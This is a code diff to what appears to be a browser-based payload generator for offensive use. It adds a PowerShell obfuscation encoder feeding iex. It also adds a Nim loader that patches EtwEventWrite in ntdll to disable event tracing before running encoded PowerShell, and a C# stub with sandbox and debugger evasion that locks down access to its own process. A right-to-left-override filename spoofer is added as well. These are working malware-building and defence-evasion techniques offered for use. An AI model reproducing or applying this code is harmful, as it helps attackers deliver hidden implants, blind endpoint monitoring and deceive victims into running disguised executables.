@@ -289,7 +289,7 @@ function generate_powershell_http() {
     
 
         $postParams = @{rfile=$command_here}
-        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"} -Method POST -Body $postParams 
+        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"}  -Body $postParams 
     }
     $varrrrr = 1
     
@@ -374,12 +374,26 @@ function generate_powershell_http() {
     base = base.replaceAll("-Encoding", random_case("-Encoding"))
     base = base.replaceAll("Microsoft.PowerShell.Commands.WebRequestSession", random_case("Microsoft.PowerShell.Commands.WebRequestSession"))
     base = base.replaceAll("id_value_change_here", Math.floor(Math.random() * 10000))
+    const old_base = base
+    const custom_encoder_status = document.getElementById("custom_encoder_powershell_id").checked
+    if(custom_encoder_status){
+        base = custom_encode(base)
 
-
+    }
     document.getElementById("powershell_textarea").innerHTML = base
 
 }
+const encoder_checkbox = document.getElementById("custom_encoder_powershell_id");
 
+encoder_checkbox.addEventListener("change", function() {
+  if (this.checked) {
+    // Checkbox is checked
+    generate_powershell_http()
+    // Perform some action
+  }else{
+    generate_powershell_http()
+  }
+});
 function powershell_template(IP,time_sleep){
     
     let base =
@@ -397,7 +411,7 @@ function powershell_template(IP,time_sleep){
     
 
         $postParams = @{rfile=$command_here}
-        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"} -Method POST -Body $postParams 
+        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"}  -Body $postParams 
     }
     $varrrrr = 1
     
@@ -735,7 +749,14 @@ import std/[times, os]
 import std/httpclient
 import osproc
 import std/strutils
-
+import winim/lean
+import strformat
+import dynlib
+    
+when defined amd64:
+    const patch: array[1, byte] = [byte 0xc3]
+elif defined i386:
+    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
 proc sleep1(): void = 
   let time1234 = cpuTime()
   sleep(3000) 
@@ -752,14 +773,41 @@ proc send_request(): void=
   var client1234 = newHttpClient()
   var c1234 = client1234.getContent("https://google.com")
 
-sleep1()
-cores()
-send_request()
-var powershell1234 = powershell_replace
-var noprofile1234 = noprofile_replace
-var nologo1234 = nologo_replace
-let errC = execCmd("$# $# $# -c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('powershell_encoded')))" % [powershell1234,noprofile1234,nologo1234])
+proc Patchntdll(): bool =
+    var
+        ntdll: LibHandle
+        cs: pointer
+        op: DWORD
+        t: DWORD
+        disabled: bool = false
 
+    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
+    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
+    ntdll = loadLib("ntdll")
+    if isNil(ntdll):
+        return disabled
+
+    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
+    if isNil(cs):
+        return disabled
+
+    if VirtualProtect(cs, patch.len, 0x40, addr op):
+        copyMem(cs, unsafeAddr patch, patch.len)
+        VirtualProtect(cs, patch.len, op, addr t)
+        disabled = true
+
+    return disabled
+
+when isMainModule:
+    var success = Patchntdll()
+    sleep1()
+    cores()
+    send_request()
+    var powershell1234 = powershell_replace
+    var noprofile1234 = noprofile_replace
+    var nologo1234 = nologo_replace
+    let errC = execCmd("$# $# $# -c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('powershell_encoded')))" % [powershell1234,noprofile1234,nologo1234])
+    
     `
     let time = document.getElementById('nim_time').value 
 
@@ -812,6 +860,8 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using Microsoft.Diagnostics.Tracing.Parsers.Clr;
+using System.Security;
 namespace Anti_everything
 {
 
@@ -832,6 +882,7 @@ namespace Anti_everything
             bypass_sandbox_drive();
             sleep();
             detect_debuger();
+            SetProcessSecurityDescriptor();
             StartGame();
         }
         
@@ -906,7 +957,50 @@ namespace Anti_everything
             }
         }
 
-        
+        public static void SetProcessSecurityDescriptor()
+        {
+           string sddl ="D:P(D;;GA;;;WD)";  
+              
+            IntPtr securityDescriptor = IntPtr.Zero;
+    
+            if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, 1, out securityDescriptor, IntPtr.Zero))
+            {
+                return;
+            }
+    
+            if (!SetKernelObjectSecurity(GetCurrentProcess(), 0x4, securityDescriptor))
+            {
+            }
+    
+            LocalFree(securityDescriptor);
+        }
+    
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [SuppressUnmanagedCodeSecurity]
+        private static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
+            string StringSecurityDescriptor,
+            int StringSDRevision,
+            out IntPtr SecurityDescriptor,
+            IntPtr SecurityDescriptorSize
+        );
+    
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [SuppressUnmanagedCodeSecurity]
+        private static extern bool SetKernelObjectSecurity(
+            IntPtr Handle,
+            int SecurityInformation,
+            IntPtr SecurityDescriptor
+        );
+    
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [SuppressUnmanagedCodeSecurity]
+        private static extern IntPtr GetCurrentProcess();
+    
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [SuppressUnmanagedCodeSecurity]
+        private static extern IntPtr LocalFree(
+            IntPtr hMem
+        );
 
 
 
@@ -918,6 +1012,9 @@ let url = document.getElementById("csharp_url").value
 let time = document.getElementById("csharp_time").value
 let random_url = document.getElementById("csharp_random_url").value
 base = base.replaceAll("Anti_everything",makeid(6))
+base = base.replaceAll("SetProcessSecurityDescriptor",makeid(6))
+base = base.replaceAll("noprofile1234",makeid(6))
+
 base = base.replaceAll("Program",makeid(6))
 base = base.replaceAll("StartGame",makeid(6))
 base = base.replaceAll("bypass_sandbox_drive",makeid(6))
@@ -935,7 +1032,6 @@ base = base.replaceAll("sleep",makeid(6))
 base = base.replaceAll("random_url",random_url)
 base = base.replaceAll("powershell1234",makeid(6))
 base = base.replaceAll("nologo1234",makeid(6))
-base = base.replaceAll("noprofile1234 ",makeid(6))
 
 base = base.replaceAll("powershell_here",csharp_replace("powershell.exe"))
 base = base.replaceAll("nologo_here",csharp_replace("-nologo"))
@@ -946,4 +1042,93 @@ base = base.replaceAll("powershell_encoded",btoa(powershell_template(url,time)))
 
 document.getElementById("csharp_textarea").innerHTML = base;
 
+}
+const rtlo = ()=>{
+    let name = document.getElementById("rtlo_encode_id").value
+    let ext = document.getElementById("rtlo_encode_ext_id").value
+    name = name.split("").reverse().join("")
+    name = `‮${name}`
+    document.getElementById("rtlo_encode_result_id").value = name+"."+ext
+}
+
+const Ascii_char_handle = (char)=>{
+    const zero = '${=}'
+    const one = '${+}'
+    const two = '${@}'
+    const three ='${.}'
+    const four = '${[}'
+    const five = '${]}'
+    const six = '${(}'
+    const seven = '${)}'
+    const eight = '${&}'
+    const nine = '${|}'
+
+    let chars = char.toString().split("")
+    let return_string = ""
+    for(i=0;i<chars.length;i++){
+        if(chars[i] == "0"){
+            return_string+= zero+'+'
+        }
+        if(chars[i] == "1"){
+            return_string+= one+'+'
+        }
+        if(chars[i] == "2"){
+            return_string+= two+'+'
+        }
+        if(chars[i] == "3"){
+            return_string+= three+'+'
+        }
+        if(chars[i] == "4"){
+            return_string+= four+'+'
+        }
+        if(chars[i] == "5"){
+            return_string+= five+'+'
+        }
+
+        if(chars[i] == "6"){
+            return_string+= six+'+'
+        }
+        if(chars[i] == "7"){
+            return_string+= seven+'+'
+        }
+        if(chars[i] == "8"){
+            return_string+= eight+'+'
+        }
+        if(chars[i] == "9"){
+            return_string+= nine+'+'
+        }
+    }
+    return_string = return_string.slice(0, -1);
+
+    return "${\"}+"+return_string.replace("\"\"","\"+\"")
+}
+const custom_encode = (str)=>{
+    let init = "${;}=+$()"
+    init +=";${=}=${;}"
+    init +=";${+}=++${;}"
+    init +=";${@}=++${;}"
+    init +=";${.}=++${;}"
+    init +=";${[}=++${;}"
+    init +=";${]}=++${;}"
+    init +=";${(}=++${;}"
+    init +=";${)}=++${;}"
+    init +=";${&}=++${;}"
+    init +=";${|}=++${;}"
+    init +=";"
+    init +='${"}="["+"$(@{})"[${)}]+"$(@{})"["${+}${|}"]+"$(@{})"["${@}${=}"]+"$?"[${+}]+"]"'
+    init +=';'
+    init +='${;}="".("$(@{})"["${+}${[}"]+"$(@{})"["${+}${(}"]+"$(@{})"[${=}]+"$(@{})"[${[}]+"$?"[${+}]+"$(@{})"[${.}])'
+    init +=';'
+    init +='${;}="$(@{})"["${+}${[}"]+"$(@{})"[${[}]+"${;}"["${@}${)}"]'
+    init+=";"
+    const iex = "&${;}"
+let return_string = ""
+for(let i = 0; i < str.length; i++) {
+    let asciiCode = str.charCodeAt(i);
+    return_string +=Ascii_char_handle(asciiCode) + "+\"+\"+"
+    
+}
+return_string = return_string.slice(0, -5);
+
+return init+return_string + ` | ${iex}` + `| ${iex}`
 }
